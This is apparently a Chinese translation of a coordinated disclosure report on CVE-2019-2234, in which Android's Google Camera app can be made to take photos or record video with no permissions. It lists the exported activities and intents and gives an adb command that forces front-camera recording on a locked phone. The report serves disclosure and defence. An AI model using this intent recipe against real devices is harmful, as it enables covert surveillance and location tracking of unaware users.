@@ -1,0 +1,232 @@
+**Checkmarx 安全研究团队的研究人员表示，任何应用程序在不具备具体权限的情况下均可控制谷歌的安卓摄像头 app
+并强制其拍照和/或录视频，即使手机锁定且屏幕关闭的情况也不例外。该团队将研究结果告知谷歌，后者通知了其它安卓厂商，其中三星已确认其智能手机中也存在这些漏洞。谷歌指出其它原始设备制造厂商也确认了这些漏洞的存在，影响全球数亿台设备。该团队在报告中说明的是从
+Pixel 2和 Pixel 3 设备上找到的漏洞，不过谷歌所有的手机模型均存在这些被统称为 CVE-2019-2234 的漏洞问题。**
+
+## 详情
+
+谷歌智能手机在com.google.android.GoogleCamera 数据包中提供了一个摄像头应用。团队决定分析这款应用中是否存在漏洞。
+
+Google Camera app的导出活动如下，任何其它应用无需具备任何权限均可调用这些活动：
+
+    
+    
+    com.google.android.apps.camera.legacy.app.activity.main.CameraActivity
+    com.android.camera.CameraLauncher com.android.camera.CameraActivity
+    com.android.camera.activity.CaptureActivity
+    com.android.camera.VideoCamera
+    com.android.camera.CameraImageActivity
+    com.android.camera.CameraVideoShortcutActivity
+    com.android.camera.CameraDeepLinkActivity
+    com.android.camera.SecureCameraActivity
+    com.google.android.apps.camera.legacy.app.settings.CameraSettingsActivity
+    com.google.android.apps.camera.legacy.app.refocus.ViewerActivity
+    com.google.android.apps.camera.photobooth.activity.PhotoboothActivity
+    com.google.android.libraries.social.licenses.LicenseMenuActivit
+    
+
+不受保护的活动数量如此之多，我们因此将每种活动映射到相应的类并进行分别测试，以查看是否可以通过任何不安全的代码路径发现漏洞。
+
+这些活动解析为如下类：
+
+    
+    
+    com.google.android.apps.camera.legacy.app.activity.main.CameraActivity
+    com.google.android.apps.camera.legacy.app.activity.CaptureActivity
+    com.google.android.apps.camera.legacy.app.activity.CameraImageActivity
+    com.google.android.apps.camera.legacy.app.activity.CameraDeepLinkActivity
+    com.google.android.apps.camera.legacy.app.activity.SecureCameraActivity
+    com.google.android.apps.camera.legacy.app.settings.CameraSettingsActivity
+    com.google.android.apps.camera.legacy.app.refocus.ViewerActivity
+    com.google.android.apps.camera.photobooth.activity.PhotoboothActivity
+    com.google.android.libraries.social.licenses.LicenseMenuActivity
+    
+
+另外，我们可以很容易地看到被映射的动作如下：
+
+    
+    
+    android.media.action.IMAGE_CAPTURE:
+    com.google.android.GoogleCamera/com.android.camera.activity.CaptureActivity
+    ---    Action: “android.media.action.IMAGE_CAPTURE”
+    Category: “android.intent.category.DEFAULT”
+    
+    
+    
+    android.media.action.IMAGE_CAPTURE_SECURE:
+    com.google.android.GoogleCamera/com.android.camera.SecureCameraActivity
+    ---    Action: “android.media.action.IMAGE_CAPTURE_SECURE”
+    Category: “android.intent.category.DEFAULT”
+    
+    
+    
+    android.intent.action.MAIN:
+    com.google.android.GoogleCamera/com.android.camera.CameraLauncher
+    ---    Action: “android.intent.action.MAIN”
+    Category: “android.intent.category.DEFAULT”
+    Category: “android.intent.category.LAUNCHER”
+    com.google.android.GoogleCamera/com.android.camera.CameraActivity
+    Action: “android.intent.action.MAIN”
+    Category: “android.intent.category.DEFAULT”
+    
+    
+    
+    android.media.action.STILL_IMAGE_CAMERA:
+    com.google.android.GoogleCamera/com.android.camera.CameraImageActivity
+    ---    Action: “android.media.action.STILL_IMAGE_CAMERA”
+    Category: “android.intent.category.DEFAULT”
+    Category: “android.intent.category.VOICE”
+    
+    
+    
+    android.media.action.STILL_IMAGE_CAMERA_SECURE:
+    com.google.android.GoogleCamera/com.android.camera.SecureCameraActivity
+    ---    Action: “android.media.action.STILL_IMAGE_CAMERA_SECURE”
+    Category: “android.intent.category.DEFAULT”
+    Category: “android.intent.category.VOICE”
+    
+    
+    
+    android.media.action.VIDEO_CAPTURE:
+    com.google.android.GoogleCamera/com.android.camera.VideoCamera
+    ---    Action: “android.media.action.VIDEO_CAPTURE”
+    Category: “android.intent.category.DEFAULT”
+    
+    
+    
+    android.media.action.VIDEO_CAMERA:
+    com.google.android.GoogleCamera/com.android.camera.CameraVideoShortcutActivity
+    ---    Action: “android.media.action.VIDEO_CAMERA”
+    Category: “android.intent.category.DEFAULT”
+    Category: “android.intent.category.VOICE”
+    
+
+经过对不同动作的测试，我们可以得出：
+
+> 调用 android.media.action.VIDEO_CAMERA动作启动 Google Camera，后者会立即开始录制视频;
+>
+> 调用 android.media.action.VIDEO_CAPTURE动作并不会使 Google Camera 开始录制视频;
+>
+> 任何其它动作均可在拍照模式下打开 Google Camera app 但并不会使其拍照。
+
+收集并测试可调用的动作后，我们搜索了可影响该 app 行为的其它功能代码。
+
+经过剖析多个类后，我们注意到了一些有意思的其它功能 (extra)：
+
+> android.intent.extra.USE_FRONT_CAMERA – 使用户选择前置摄像头（如没有，则可选择后置摄像头）
+>
+> android.intent.extra.TIMER_DURATION_SECONDS – 使摄像头在拍照前设置计时器（最少是3秒钟，为硬编码）
+>
+> extra_turn_screen_on – 模糊标志，可能是用于需要打开设备屏幕的可穿戴设备
+
+## 发现多个漏洞
+
+通过操纵具体的动作和意图，攻击者现在就可以控制 Google Camera app
+通过无权限的恶意应用拍照和/或记录视频。另外，我们发现某些公机场景使恶意行为者规避多种存储权限策略，从而能够访问存储的视频和照片以及内嵌在照片中的 GPS
+元数据，通过拍照或录制视频并解析适当的 EXIF 数据来定位用户。这样做有问题吗？
+
+安卓摄像头应用通常会将照片和视频存储在 SD 卡中。由于照片和视频是敏感的而用户信息，因此应用程序需要特别的存储权限才能够访问这些信息。
+
+遗憾的是，存储权限的范围非常广阔，并且它们提供对整个 SD 卡的访问权限。另外，具有合法用例的大量应用程序虽然没有访问照片和视频的必要，仍然会访问存储权限。
+
+应用程序从视频、麦克风和 GPS 位置中获取输入的能力具有高度入侵性，而 AOSP 甚至为这些权限专门创建了权限组。
+
+具有访问存储权限的应用程序通过利用上述问题不仅能够访问历史照片和视频（这是权限设计所允许的，已并非新鲜事），还能够通过滥用 Google Camera
+app 导出组件来访问新拍摄的照片和视频。
+
+这意味着恶意应用程序能够在无需特定摄像头权限的情况下拍照和/或录制视频，而且在拍摄之后只需要存储权限就能够提取它们。另外，如果摄像头 app
+中启用了位置信息，则恶意应用程序还能够访问照片和用户当前的 GPS 定位信息。
+
+这种行为并非预期行为，因为 Google Camera app 不应当受外部应用完全控制，规避用户出于信任而给予安卓操作系统的摄像头/麦克风/GPS
+的权限。
+
+实际上，这种“功能”使请求/授予权限应用的目的无意义，如
+android.permission.CAMERA、android.permission、RECORD_AUDIO、甚至是android.permission.ACCESS_FINE_LOCATION
+和android.permission.ACCESS_COARSE_LOCATION 的权限。
+
+## PoC
+
+### 通过adb 进行验证
+
+验证这个问题最简单的方法就是通过 adb。
+
+强制录制视频，可使用如下命令：
+
+    
+    
+    $ adb shell am start-activity -n
+    com.google.android.GoogleCamera/com.android.camera.CameraActivity --ez
+    extra_turn_screen_on true -a android.media.action.VIDEO_CAMERA --ez
+    android.intent.extra.USE_FRONT_CAMERA true
+    
+
+注意，这两个命令都可以无障碍地发出，即使照片位于锁定状态也不例外。
+
+### 通过 PoCApp 验证
+
+我们开发了一个天气应用程序作为 PoC，它将和上面一样做出相同的调用。这款模拟应用已和谷歌以及三星共享。另外，我们还开发了一款高级的
+PoC，它使用了多种隐秘功能来阻止用户发现被拍摄的照片和视频。
+
+我们的视频展示了如何使用这款模拟的天气应用绕过权限进行拍摄含有位置信息的照片或视频。我们还展示了我们如何从 C&C 服务器检索照片和视频，从 SD
+卡中的图像收集 GPS 历史信息。最后，我们还自动记录了电话拨打和接听两端的信息等，而用户对此一无所知。
+
+## Fingerprint
+
+    
+    
+    $ adb shell getprop ro.build.fingerprint
+    google/blueline/blueline:9/PQ3A.190605.003/5524043:user/release-keys
+    $ adb shell dumpsys package com.google.android.GoogleCamera|grep -E “Package|version|time”
+    Packages:
+     Package [com.google.android.GoogleCamera] (ce5cc83):
+     pkg=Package{27a2e00 com.google.android.GoogleCamera}
+     versionCode=49456750 minSdk=28 targetSdk=28
+     versionName=6.2.030.244457635
+     timeStamp=2019-05-09 16:02:33
+     installerPackageName=com.android.vending
+     signatures=PackageSignatures{c09c639 version:3, signatures:[e3ca78d8], past signatures:[]}
+     Package [com.google.android.GoogleCamera] (3a4f47e):
+     pkg=Package{72eaddf com.google.android.GoogleCamera}
+     versionCode=44450387 minSdk=28 targetSdk=28
+     versionName=6.0.012.208106668
+     timeStamp=2009-01-01 08:00:00
+     signatures=PackageSignatures{fb78cf5 version:0, signatures:[], past signatures:[]}
+    
+
+## 谷歌回应
+
+谷歌表示，“非常感谢 Checkmarx 团队带给我们的信息并和谷歌以及安卓合作伙伴一道协作发布。我们已于2019年7月在应用商店中发布了 Google
+Camera Application的更新修复了受影响的谷歌设备中的问题。我们现已向所有合作伙伴推出了补丁。”
+
+## 缓解建议
+
+确保设备上的所有应用程序已更新。
+
+## 披露时间轴
+
+> 2019-07-04：向谷歌安卓安全团队提交漏洞报告
+>
+> 2019-07-04：谷歌证实已收到漏洞报告
+>
+> 2019-07-04：向谷歌发送 PoC“恶意 app”
+>
+> 2019-07-05：向谷歌发送攻击场景的 PoC 视频
+>
+> 2019-07-13：谷歌将漏洞的严重程度评定为“中等”
+>
+> 2019-07-08：向谷歌发出进一步的反馈
+>
+> 2019-07-18：谷歌将严重程度提升为“高危”
+>
+> 2019-08-01：谷歌证实了我们关于这些漏洞影响其它安卓智能手机供应商的假设并分配编号 CVE-2019-2234
+>
+> 2019-08-18：联系了多个相关供应商
+>
+> 2019-08-29：三星证实受影响
+>
+> 2019-11：谷歌和三星均同意发布这篇文章
+
+ _ **注意：这篇文章是在谷歌以及三星发布补丁之后和它们协同发布的。相关用户可登陆谷歌网站获取关于修复后的安卓操作系统和 Google Camera
+app 的更多信息。**_
+
+***参考来源：[checkmarx](https://info.checkmarx.com/hubfs/Reports/Android_Camera_Vulnerability_Report_FINAL_v2_\(002\).pdf?utm_campaign=Vulnerability%20Report%20191119%20-%20Android%20Camera%20App)，由奇安信代码卫士编译，转载请注明来自FreeBuf.COM**
+
